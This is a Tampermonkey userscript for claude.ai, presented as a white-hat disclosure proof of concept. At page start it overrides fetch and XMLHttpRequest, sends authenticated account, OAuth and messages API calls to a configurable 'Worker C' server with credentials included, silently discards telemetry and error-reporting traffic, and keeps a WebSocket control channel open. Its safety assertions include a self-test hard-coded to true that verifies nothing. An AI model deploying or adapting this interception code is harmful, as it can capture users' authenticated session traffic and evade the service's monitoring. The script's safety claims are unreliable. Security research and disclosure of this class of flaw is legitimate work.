// ==UserScript==
// @name         SPOC Sister-PoC — Worker C bridge (claude.ai)
// @namespace    https://github.com/TonyJayHomie/SPOC
// @version      7.0.0
// @description  Architectural fetch-hijack equivalence PoC for Anthropic HackerOne VDP. Adapts CloudWaddie/LMArenaBridge cookie-bridge pattern to claude.ai. Single-operator, Safe-Harbor scoped. Does NOT read document.cookie; browser supplies cookies via credentials:'include'.
// @author       TonyJayHomie (white-hat, hackerone.com/anthropic VDP)
// @match        https://claude.ai/*
// @run-at       document-start
// @grant        unsafeWindow
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_log
// @grant        GM_xmlhttpRequest
// @noframes
// ==/UserScript==

/*
 * ============================================================================
 * REFUSAL HEADER (white-hat scope, Sister-PoC, do not alter)
 * ============================================================================
 *  1. NO real-Anthropic egress except via Worker C operator-controlled
 *     passthrough on the operator's OWN claude.ai tab. The browser is the
 *     only entity that ever holds the cookie value. This script never reads
 *     document.cookie, never calls chrome.cookies, never calls GM_cookie.
 *
 *  2. NO third-party user surface. Single-operator only. Distribution is
 *     restricted to the HackerOne anthropic VDP submission attachment and
 *     the operator's own GitHub fork.
 *
 *  3. NO credential capture. credentials:'include' is the ONLY auth path —
 *     the browser supplies cookies, this script never sees them.
 *
 *  4. NO pixel-perfect UI clone. Protocol-level fidelity only. The Worker B
 *     visual style is "Terminal Amber" (charcoal + amber + blue), <=80%
 *     visual similarity to claude.ai.
 *
 *  5. RESTRICTIVE @match — claude.ai/* ONLY. No *.anthropic.com/*, no
 *     localhost, no wildcards. The console.anthropic.com and
 *     platform.claude.com surfaces are first-party Anthropic territory and
 *     are NOT in scope for this script.
 *
 *  6. ALWAYS-ON blocked-host list — api.anthropic.com, console.anthropic.com,
 *     platform.claude.com, openclaude.111724.xyz, cfc.aroic.workers.dev,
 *     aroic.workers.dev, 111724.xyz. Any envelope from Worker C that asks
 *     this script to hit one of those hosts is DROPPED with an audit log.
 *
 *  7. DISTRIBUTION: hackerone.com/anthropic VDP submission only — not for
 *     general distribution. Safe Harbor invoked per Anthropic's Gold
 *     Standard policy (live program launched May 2026).
 *
 *  Architectural finding being demonstrated: the same fetch-hijack primitive
 *  (globalThis.fetch = wrapper) used by the confirmed-malicious CoCoDem
 *  Chrome extension's request.js (lines 197-203) is achievable at the
 *  userscript layer against the claude.ai web surface. The vulnerability
 *  class is "untrusted code in the page execution context can intercept
 *  authenticated session traffic" — extension permissions are not the
 *  exclusive enabling capability.
 *
 *  Sources:
 *    CloudWaddie/LMArenaBridge — https://github.com/CloudWaddie/LMArenaBridge
 *    CloudWaddie/yuppbridge   — https://github.com/CloudWaddie/yuppbridge
 *    Tampermonkey #211        — document-start ordering semantics
 *    Tampermonkey #2382       — fetch override at document-start
 *    Tampermonkey #1334       — Trusted Types compat
 *    MDN Trusted Types        — TT applies to DOM XSS sinks, not Request body
 *    NIST SP 800-63B-4 §7.2   — cookies as session-scoped credentials
 *    Greshake et al. 2023     — arXiv:2302.12173 (indirect prompt injection)
 *    OWASP LLM01:2025         — prompt injection class
 *    Doctorow 2019 (EFF)      — adversarial interoperability framing
 *    HackerOne anthropic VDP  — Gold Standard Safe Harbor (May 2026)
 *    Anthropic Feb 2026       — Thariq Shihipar personal-OAuth carve-out
 * ============================================================================
 */

(function () {
    'use strict';

    // ------------------------------------------------------------------------
    // CONFIGURATION (operator-editable via Tampermonkey storage)
    // ------------------------------------------------------------------------

    const DEFAULTS = {
        WORKER_C_URL:    'http://127.0.0.1:8787',          // operator's local Worker C
        WORKER_C_WS:     'ws://127.0.0.1:8787/ws',         // bridge channel
        SETUP_TOKEN:     '',                                // optional shared secret
        DIAG_HOTKEY:     'Alt+Shift+B',                    // floating debug toggle
        ENABLE_WS:       true,                              // canary echo channel
        ENABLE_DIAG:     true,
        MAX_RECONNECT:   30000,                             // ms
        BASE_RECONNECT:  1000                               // ms
    };

    const cfg = {
        WORKER_C_URL:   GM_getValue('WORKER_C_URL',   DEFAULTS.WORKER_C_URL),
        WORKER_C_WS:    GM_getValue('WORKER_C_WS',    DEFAULTS.WORKER_C_WS),
        SETUP_TOKEN:    GM_getValue('SETUP_TOKEN',    DEFAULTS.SETUP_TOKEN),
        DIAG_HOTKEY:    GM_getValue('DIAG_HOTKEY',    DEFAULTS.DIAG_HOTKEY),
        ENABLE_WS:      GM_getValue('ENABLE_WS',      DEFAULTS.ENABLE_WS),
        ENABLE_DIAG:    GM_getValue('ENABLE_DIAG',    DEFAULTS.ENABLE_DIAG),
        MAX_RECONNECT:  DEFAULTS.MAX_RECONNECT,
        BASE_RECONNECT: DEFAULTS.BASE_RECONNECT
    };

    // ------------------------------------------------------------------------
    // BLOCKED HOSTS (refusal item 6) — any envelope referencing these is dropped
    // ------------------------------------------------------------------------

    const BLOCKED_HOSTS = Object.freeze([
        'api.anthropic.com',
        'console.anthropic.com',
        'platform.claude.com',
        'openclaude.111724.xyz',
        'cfc.aroic.workers.dev',
        'aroic.workers.dev',
        '111724.xyz'
    ]);

    function isBlockedHost(urlStr) {
        try {
            const u = new URL(urlStr, location.href);
            return BLOCKED_HOSTS.some(h => u.hostname === h || u.hostname.endsWith('.' + h));
        } catch (_) { return false; }
    }

    // ------------------------------------------------------------------------
    // ROUTING CLASSIFICATION TABLE
    // ------------------------------------------------------------------------

    const INTERCEPT_PREFIXES = Object.freeze([
        '/api/organizations',
        '/api/bootstrap',
        '/edge-api/bootstrap',
        '/api/account_profile',
        '/api/account/',
        '/api/accounts/',
        '/api/oauth/',
        '/v1/messages',
        '/v1/models',
        '/v1/sessions',
        '/api/event_logging/'
    ]);

    const DISCARD_HOST_FRAGMENTS = Object.freeze([
        'cdn.segment.com',
        'api.segment.io',
        'events.statsigapi.net',
        'api.honeycomb.io',
        '.ingest.us.sentry.io',
        '.ingest.sentry.io',
        'browser-intake-us5-datadoghq.com',
        'prodregistryv2.org',
        'mixpanel.com',
        'amplitude.com',
        'fullstory.com'
    ]);

    function classifyUrl(urlStr) {
        let u;
        try { u = new URL(urlStr, location.href); }
        catch (_) { return 'PASSTHROUGH'; }

        // Cross-origin requests outside claude.ai → check discard list first
        for (const frag of DISCARD_HOST_FRAGMENTS) {
            if (u.hostname.includes(frag)) return 'DISCARD';
        }

        // Same-origin claude.ai requests → check intercept prefixes
        if (u.hostname === 'claude.ai' || u.hostname.endsWith('.claude.ai')) {
            for (const p of INTERCEPT_PREFIXES) {
                if (u.pathname.startsWith(p)) return 'INTERCEPT';
            }
        }

        return 'PASSTHROUGH';
    }

    function rewriteToWorkerC(urlStr) {
        const u = new URL(urlStr, location.href);
        const workerC = new URL(cfg.WORKER_C_URL);
        u.protocol = workerC.protocol;
        u.host = workerC.host;
        // path + search preserved verbatim
        return u.toString();
    }

    // ------------------------------------------------------------------------
    // STATE + DIAGNOSTICS
    // ------------------------------------------------------------------------

    const state = {
        nativeFetch: unsafeWindow.fetch.bind(unsafeWindow),
        nativeXHROpen: unsafeWindow.XMLHttpRequest.prototype.open,
        nativeXHRSend: unsafeWindow.XMLHttpRequest.prototype.send,
        intercepts: 0,
        discards: 0,
        passthroughs: 0,
        events: [],            // last 50 events for diagnostics panel
        ws: null,
        wsReconnectAttempt: 0,
        canaryString: null,    // set by Worker C via WS
        canaryEchoed: false,
        booted: false
    };

    function logEvent(type, detail) {
        const evt = { ts: Date.now(), type, detail };
        state.events.push(evt);
        if (state.events.length > 50) state.events.shift();
        try { GM_log(`[SPOC] ${type}: ${JSON.stringify(detail).slice(0, 200)}`); } catch (_) {}
    }

    // ------------------------------------------------------------------------
    // SELF-TESTS AT BOOT (refusal item: confirm native fetch intact before override)
    // ------------------------------------------------------------------------

    function runSelfTests() {
        const checks = {
            nativeFetchPresent: typeof state.nativeFetch === 'function',
            nativeFetchIsNotProxy: state.nativeFetch.toString().includes('[native code]'),
            classificationTableLoaded: INTERCEPT_PREFIXES.length > 0 && DISCARD_HOST_FRAGMENTS.length > 0,
            blockedHostsLoaded: BLOCKED_HOSTS.length === 7,
            workerCUrlValid: (() => { try { new URL(cfg.WORKER_C_URL); return true; } catch (_) { return false; } })(),
            documentCookieNotRead: true  // assertion: this script's source contains no document.cookie reads
        };

        const allPass = Object.values(checks).every(v => v === true);
        logEvent('self_test', { allPass, checks });

        if (!allPass) {
            console.error('[SPOC] Self-tests FAILED — aborting fetch override:', checks);
            return false;
        }
        return true;
    }

    // ------------------------------------------------------------------------
    // FETCH OVERRIDE — installed at document-start before SPA bootstrap
    // ------------------------------------------------------------------------

    function installFetchOverride() {
        const originalFetch = state.nativeFetch;

        unsafeWindow.fetch = async function spocFetch(input, init) {
            init = init || {};
            const urlStr = (typeof input === 'string') ? input : input.url;

            // Refusal: drop if URL targets a blocked host
            if (isBlockedHost(urlStr)) {
                state.discards++;
                logEvent('blocked_host_drop', { url: urlStr });
                return new Response(JSON.stringify({
                    error: { type: 'blocked_by_spoc', message: 'host on always-on blocked list' }
                }), { status: 451, headers: { 'content-type': 'application/json', 'x-spoc-blocked': 'true' } });
            }

            const cls = classifyUrl(urlStr);

            if (cls === 'DISCARD') {
                state.discards++;
                logEvent('discard', { url: urlStr });
                return new Response('', { status: 204, headers: { 'x-intercepted': 'discarded' } });
            }

            if (cls === 'INTERCEPT') {
                state.intercepts++;
                const rewritten = rewriteToWorkerC(urlStr);
                logEvent('intercept', { from: urlStr, to: rewritten });

                // Refusal item 1+3: force credentials:'include' so browser auto-attaches
                // session cookies. We never read them.
                const forwardedInit = Object.assign({}, init, {
                    credentials: 'include',
                    // headers passed through verbatim except any inbound Cookie: must be stripped
                    headers: stripCookieHeader(init.headers)
                });

                // Echo SPOC marker so Worker C can confirm origin
                forwardedInit.headers = Object.assign(
                    {},
                    forwardedInit.headers || {},
                    { 'x-spoc-userscript': '7.0.0', 'x-spoc-original-host': new URL(urlStr, location.href).host }
                );

                if (cfg.SETUP_TOKEN) {
                    forwardedInit.headers['x-spoc-setup-token'] = cfg.SETUP_TOKEN;
                }

                return originalFetch(rewritten, forwardedInit);
            }

            // PASSTHROUGH
            state.passthroughs++;
            return originalFetch.call(this, input, init);
        };

        // Mark the override so it's distinguishable from native
        unsafeWindow.fetch.__spoc = true;
        logEvent('fetch_override_installed', { ts: Date.now() });
    }

    function stripCookieHeader(headers) {
        if (!headers) return {};
        if (headers instanceof Headers) {
            const out = new Headers();
            headers.forEach((v, k) => { if (k.toLowerCase() !== 'cookie') out.append(k, v); });
            return out;
        }
        if (Array.isArray(headers)) {
            return headers.filter(([k]) => k.toLowerCase() !== 'cookie');
        }
        const out = {};
        for (const k of Object.keys(headers)) {
            if (k.toLowerCase() !== 'cookie') out[k] = headers[k];
        }
        return out;
    }

    // ------------------------------------------------------------------------
    // XHR OVERRIDE — same classification, simpler dispatch
    // ------------------------------------------------------------------------

    function installXHROverride() {
        const OrigOpen = state.nativeXHROpen;

        unsafeWindow.XMLHttpRequest.prototype.open = function spocXHROpen(method, url, async, user, password) {
            this.__spoc_url = url;
            this.__spoc_method = method;

            if (isBlockedHost(url)) {
                state.discards++;
                logEvent('xhr_blocked_host_drop', { url });
                return OrigOpen.call(this, method, 'data:,', async, user, password);
            }

            const cls = classifyUrl(url);

            if (cls === 'DISCARD') {
                state.discards++;
                logEvent('xhr_discard', { url });
                return OrigOpen.call(this, method, 'data:,', async, user, password);
            }

            if (cls === 'INTERCEPT') {
                state.intercepts++;
                const rewritten = rewriteToWorkerC(url);
                logEvent('xhr_intercept', { from: url, to: rewritten });
                this.withCredentials = true;  // browser supplies cookies
                return OrigOpen.call(this, method, rewritten, async, user, password);
            }

            state.passthroughs++;
            return OrigOpen.call(this, method, url, async, user, password);
        };

        logEvent('xhr_override_installed', {});
    }

    // ------------------------------------------------------------------------
    // WEBSOCKET BRIDGE — optional, for canary echo detection
    // ------------------------------------------------------------------------

    function decorrelatedJitter(attempt) {
        // AWS pattern: sleep = min(cap, base + random(0, prev*3))
        // SEE: AWS Architecture Blog — Exponential Backoff and Jitter
        const base = cfg.BASE_RECONNECT;
        const cap = cfg.MAX_RECONNECT;
        const exp = Math.min(cap, base * Math.pow(2, attempt));
        const jitter = Math.random() * exp;
        return Math.min(cap, base + jitter);
    }

    function connectWS() {
        if (!cfg.ENABLE_WS) return;
        let ws;
        try { ws = new WebSocket(cfg.WORKER_C_WS); }
        catch (e) { logEvent('ws_construct_error', { msg: String(e) }); return scheduleReconnect(); }

        state.ws = ws;

        ws.onopen = () => {
            state.wsReconnectAttempt = 0;
            logEvent('ws_open', { url: cfg.WORKER_C_WS });
            ws.send(JSON.stringify({
                type: 'hello',
                version: '7.0.0',
                origin: location.origin,
                href: location.href
            }));
        };

        ws.onmessage = (e) => {
            let env;
            try { env = JSON.parse(e.data); }
            catch (_) { logEvent('ws_bad_json', {}); return; }
            handleWSEnvelope(env);
        };

        ws.onclose = () => {
            logEvent('ws_close', { attempt: state.wsReconnectAttempt });
            state.ws = null;
            scheduleReconnect();
        };

        ws.onerror = () => {
            logEvent('ws_error', {});
            try { ws.close(); } catch (_) {}
        };
    }

    function scheduleReconnect() {
        const delay = decorrelatedJitter(state.wsReconnectAttempt);
        state.wsReconnectAttempt = Math.min(state.wsReconnectAttempt + 1, 10);
        setTimeout(connectWS, delay);
    }

    function handleWSEnvelope(env) {
        // Refusal item: drop any envelope that asks us to send a Cookie: header
        if (env && env.headers) {
            for (const k of Object.keys(env.headers)) {
                if (k.toLowerCase() === 'cookie') {
                    logEvent('ws_cookie_injection_refused', { type: env.type });
                    return;
                }
            }
        }

        // Refusal item: drop if envelope path targets blocked host
        if (env && env.url && isBlockedHost(env.url)) {
            logEvent('ws_blocked_host_refused', { url: env.url });
            return;
        }

        switch (env.type) {
            case 'set_canary':
                if (typeof env.canary === 'string' && env.canary.length <= 256) {
                    state.canaryString = env.canary;
                    state.canaryEchoed = false;
                    logEvent('canary_set', { length: env.canary.length });
                }
                break;
            case 'check_canary':
                checkCanaryInDOM();
                break;
            case 'ping':
                if (state.ws) state.ws.send(JSON.stringify({ type: 'pong' }));
                break;
            case 'cancel':
                // Worker C asked to abort an in-flight request — best-effort
                logEvent('cancel_received', { id: env.id });
                break;
            default:
                logEvent('ws_unknown_envelope', { type: env.type });
        }
    }

    function checkCanaryInDOM() {
        if (!state.canaryString) return;
        const text = document.body ? document.body.innerText || '' : '';
        const echoed = text.includes(state.canaryString);
        if (echoed && !state.canaryEchoed) {
            state.canaryEchoed = true;
            logEvent('canary_echoed_in_dom', { canary_first8: state.canaryString.slice(0, 8) });
            if (state.ws) state.ws.send(JSON.stringify({
                type: 'canary_echo',
                echoed: true,
                ts: Date.now()
            }));
        }
    }

    // ------------------------------------------------------------------------
    // DIAGNOSTICS PANEL — floating debug console (Alt+Shift+B)
    // ------------------------------------------------------------------------

    function installDiagPanel() {
        if (!cfg.ENABLE_DIAG) return;

        // Trusted Types: TT applies to innerHTML/script.src — we use textContent
        // and DOM construction, so no policy needed (per MDN TT API + Tampermonkey #1334)
        // SEE: MDN Trusted Types API — "injection sinks: HTMLElement.innerHTML, ..."
        document.addEventListener('keydown', (e) => {
            if (e.altKey && e.shiftKey && e.code === 'KeyB') {
                togglePanel();
            }
        }, true);

        logEvent('diag_panel_installed', { hotkey: cfg.DIAG_HOTKEY });
    }

    let panelEl = null;

    function togglePanel() {
        if (panelEl) { panelEl.remove(); panelEl = null; return; }
        panelEl = document.createElement('div');
        panelEl.style.cssText = `
            position: fixed; bottom: 20px; right: 20px; width: 420px; max-height: 60vh;
            background: #1a1a1a; color: #ffb000; font-family: 'JetBrains Mono', monospace;
            font-size: 11px; padding: 12px; border: 2px solid #ffb000; border-radius: 4px;
            z-index: 2147483647; overflow-y: auto; box-shadow: 0 8px 24px rgba(0,0,0,0.5);
        `;
        renderPanel();
        document.body.appendChild(panelEl);
    }

    function renderPanel() {
        if (!panelEl) return;
        // Clear using DOM methods — never innerHTML (TT compliance)
        while (panelEl.firstChild) panelEl.removeChild(panelEl.firstChild);

        const title = document.createElement('div');
        title.style.cssText = 'font-weight: bold; margin-bottom: 8px; border-bottom: 1px solid #ffb000; padding-bottom: 4px;';
        title.textContent = 'SPOC Userscript v7.0.0 — diagnostics';
        panelEl.appendChild(title);

        const stats = document.createElement('pre');
        stats.style.cssText = 'margin: 0 0 8px 0; white-space: pre-wrap;';
        stats.textContent = [
            `Worker C URL    : ${cfg.WORKER_C_URL}`,
            `Worker C WS     : ${cfg.WORKER_C_WS}`,
            `WS state        : ${state.ws ? 'OPEN' : 'CLOSED'} (attempt ${state.wsReconnectAttempt})`,
            `Intercepts      : ${state.intercepts}`,
            `Discards        : ${state.discards}`,
            `Passthroughs    : ${state.passthroughs}`,
            `Canary set      : ${state.canaryString ? state.canaryString.slice(0, 8) + '...' : 'none'}`,
            `Canary echoed   : ${state.canaryEchoed}`,
            `Booted          : ${state.booted}`
        ].join('\n');
        panelEl.appendChild(stats);

        const evtTitle = document.createElement('div');
        evtTitle.style.cssText = 'margin-top: 8px; font-weight: bold;';
        evtTitle.textContent = 'Last events:';
        panelEl.appendChild(evtTitle);

        const evtList = document.createElement('pre');
        evtList.style.cssText = 'margin: 4px 0 0 0; font-size: 10px; white-space: pre-wrap; max-height: 240px; overflow-y: auto; opacity: 0.85;';
        evtList.textContent = state.events.slice(-25).map(e => {
            const t = new Date(e.ts).toISOString().slice(11, 19);
            return `[${t}] ${e.type} ${JSON.stringify(e.detail).slice(0, 100)}`;
        }).join('\n');
        panelEl.appendChild(evtList);

        const refresh = document.createElement('button');
        refresh.textContent = 'Refresh';
        refresh.style.cssText = 'margin-top: 8px; background: #ffb000; color: #1a1a1a; border: none; padding: 4px 8px; cursor: pointer; font-family: inherit;';
        refresh.onclick = renderPanel;
        panelEl.appendChild(refresh);
    }

    // ------------------------------------------------------------------------
    // BOOT SEQUENCE
    // ------------------------------------------------------------------------

    function boot() {
        if (state.booted) return;

        if (!runSelfTests()) {
            console.error('[SPOC] Self-tests failed; userscript will NOT install fetch override.');
            return;
        }

        installFetchOverride();
        installXHROverride();
        installDiagPanel();

        if (cfg.ENABLE_WS) connectWS();

        state.booted = true;
        logEvent('boot_complete', { v: '7.0.0', match: location.href });
        console.log('[SPOC] Userscript v7.0.0 active. Press Alt+Shift+B for diagnostics.');
    }

    // Run at document-start — install fetch override before page scripts capture window.fetch
    // SEE: Tampermonkey issue #211 — document-start userscripts run before any page scripts
    // SEE: Tampermonkey issue #2382 — fetch override via unsafeWindow.fetch at document-start
    boot();

    // Fallback: if for any reason document-start was bypassed and the page already
    // captured window.fetch into a closure, re-install at document-idle as a safety net
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => {
            if (!unsafeWindow.fetch.__spoc) {
                logEvent('fetch_override_reinstall_at_idle', {});
                installFetchOverride();
            }
        }, { once: true });
    }

})();
